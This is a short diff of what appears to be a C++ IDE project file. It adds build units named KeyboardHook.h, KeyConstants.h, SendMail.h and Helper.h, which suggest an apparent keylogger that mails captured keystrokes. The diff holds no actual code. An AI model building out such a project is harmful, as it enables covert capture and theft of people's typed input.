@@ -33,7 +33,11 @@
 			<Add option="-fexceptions" />
 		</Compiler>
 		<Unit filename="Base64.h" />
+		<Unit filename="Helper.h" />
 		<Unit filename="IO.h" />
+		<Unit filename="KeyConstants.h" />
+		<Unit filename="KeyboardHook.h" />
+		<Unit filename="SendMail.h" />
 		<Unit filename="Timer.h" />
 		<Unit filename="main.cpp" />
 		<Extensions>
